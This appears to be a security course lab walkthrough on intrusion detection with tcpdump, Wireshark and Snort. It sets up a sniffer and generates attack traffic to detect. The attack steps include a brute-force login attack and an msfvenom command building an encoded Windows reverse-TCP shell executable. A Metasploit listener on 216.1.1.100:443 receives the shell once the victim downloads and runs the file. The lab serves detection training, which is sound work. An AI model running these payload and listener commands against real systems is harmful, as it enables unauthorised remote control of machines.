## LAB 8 - Intrusion Detection Using Snort

### Objectives

- Set Up the Sniffer
- Detect Unwanted Incoming Traffic
- Detect Unwanted Outgoing Traffic

| Key Term      | Description                                                                                                                                                                                                                                                                                                                                         |
| ------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Wireshark<br> | A protocol analyzer that read binary capture files. Wireshark will also allow you to capture network traffic and runs on Windows, Linux, and on Mac OS X.<br>                                                                                                                                                                                       |
| snort<br>     | An Intrusion Detection System, or an IDS, that can be used to analyze and capture traffic. By using signatures, snort can provide information about activity within a capture file. Snort can be downloaded from www.snort.org and is a free and commercial tool. Sourcefire, a Columbia, Maryland–based company, maintains and develops snort.<br> |
| tcpdump<br>   | A Linux/UNIX program that allows you to capture network traffic. The tcpdump program comes installed on many Linux distributions by default.<br>                                                                                                                                                                                                    |
| Sniffer<br>   | A Sniffer is used to capture network traffic on a network. Software programs like tcpdump, Wireshark, and Network Miner can be used to sniff traffic.<br><br>                                                                                                                                                                                       |
| PCAP File<br> | Programs that can sniff network traffic like tcpdump, Wireshark, and Network Miner allow you to save the network capture to a PCAP file format. In order to read the PCAP format, you need a tool like Wireshark or Network Miner.<br>                                                                                                              |

### Setting Up the Sniffer

#### Logging On To The Sniffer

1. Log in to the sniffer machine (likely running Kali Linux w/ no IP)
2. Open Terminal
3. View active interfaces by running `ifconfig`
	- Neither of the interfaces, eth0 or eth1, is assigned an IP address on their respective networks. The reason the sniffer has two interfaces is that it is located on two networks, the internal network (LAN) and the external network (WAN)

A sniffer should be operating in promiscuous mode so it can see all network traffic. To put the interfaces into promiscuous mode, follow the next steps:

Two ways to ensure that a sniffer will capture all traffic on a network segment:

- Connect the sniffer and other devices on the network to a hub
- Connect the sniffer to a switch’s SPAN (Switched Port Analyzer) port

4. To use the first interface, run `ifconfig eth0 0.0.0.0 up`
5. To activate the second, run `ifconfig eth1 0.0.0.0 up`
6. Issue `tcpdump --help` to view available tcpdump switches
7. Run tcpdump on eth0 by running `tcpdump -i eth0`
8. While that's running, log in to the Windows 2008 Server
9. View the sniffer capture and stop it once a couple IPv4 packets show up
10. Run tcpdump on eth1 by running `tcpdump -i eth1`
11. Log in to the Windows 7 Attack Machine
12. View the sniffer capture and stop it once a couple packets show up
13. Capture traffic on the 192.168.1.0/24 network and send it to a file by running `tcpdump –i eth0 -nnntt -s 0 -w capnet1.cap -C 100`

| Switch  | Meaning                                                      |
| ------- | ------------------------------------------------------------ |
| -i eth0 | Use interface zero                                           |
| -nnntt  | Disable DNS resolution, date and time format                 |
| -s 0    | Disables default packet size of 96 bytes, full packet size   |
| -w      | Write to a capture file, instead of displaying to the screen |
| -C      | Split the captures into files of this size                   |

14. Let the capture run for a few minutes before stopping it
15. View the capture file by running `wireshark capnet1.cap`, then quit Wireshark
16. Capture traffic on the 216.0.0.0/8 network and send it to a file by running `tcpdump –i eth1 -nnntt -s 0 -w capnet2.cap -C 100`
17. Log off of the Windows 7 Attack Machine
18. Let the capture run for a few minutes before stopping it
19. View the capture file by running `wireshark capnet2.cap`, then quit Wireshark

### Detecting Unwanted Incoming Traffic

#### Detecting Attacks

1. Start the sniffer on the internal interface by running `tcpdump –i eth0 -nnntt -s 0 -w brute.cap –C 100`
2. Log in to the Windows 7 Attack Machine
3. On the Windows machine, open Command Prompt then run `nmap 216.1.1.1` to view open firewall ports
4. Open Bruter.exe
5. Input the necessary fields, then start the brute force attack
6. Click on the Testing tab to view the actions against the victim
7. View the Result tab
8. Stop tcpdump from capturing on the sniffer
9. Run `snort -l . -c /etc/snort/snort.conf -r brute.cap` then wait for a new prompt before running `ls`. Take note of the `alert.ids` file
10. Open this file with leafpad by running `leafpad alert.ids`
11. Scroll down and look for clusters of alerts, usually indicators of an attack

### Detecting Unwanted Outgoing Traffic

#### Using Wireshark

1. Start the sniffer on the internal interface by running `tcpdump –i eth0 -nntttt -s 0 -w badtraffic.cap`
2. Log on to a Kali Attack Machine that we'll create the malicious software on
3. Launch Terminal
4. Run `msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp lhost=216.1.1.100 lport=443 -f exe -e x86/shikata_ga_nai -o bad.exe` to generate a payload
5. Startup PostgreSQL by running `service postgresql start`
6. Run `msfconsole` to open the msfconsole of the Metasploit framework
7. To use the multi-handler in the msfconsole, run `use exploit/multi/handler`
8. Set the host using `set lhost 216.1.1.100`
9. Set the port using `set lport 443`
10. Set the payload to a reverse windows command shell using `set payload windows/shell/reverse_tcp`
11. Verify the options are set using `show options`
12. Use `exploit` to start listening on port 443
13. Open another Terminal, then run `apache2ctl start` to start Apache
14. View current running services by running `netstat -tan` then `nmap 127.0.0.1`
15. Copy bad.exe to the HTTP root by running `cp bad.exe /var/www/html`
16. List the files within the FTP root by running `ls /var/www/html`
17. Log back into the Internal Windows 2008 Server
18. Open Internet Explorer
19. Type the URL [http://216.1.1.100/bad.exe](http://216.1.1.100/bad.exe)
20. Click Run twice when prompted
21. Go back to the Kali 2 Attack Machine, return to the Terminal, view the connection to the victim
22. Run `dir` to list the directory
23. Go back to the sniffer, stop the tcpdump capture, then run `wireshark badtraffic.cap`
24. Type "frame contains “Microsoft Windows” in the pane then click Apply
25. Right-click a packet and follow its TCP stream
26. View the traffic

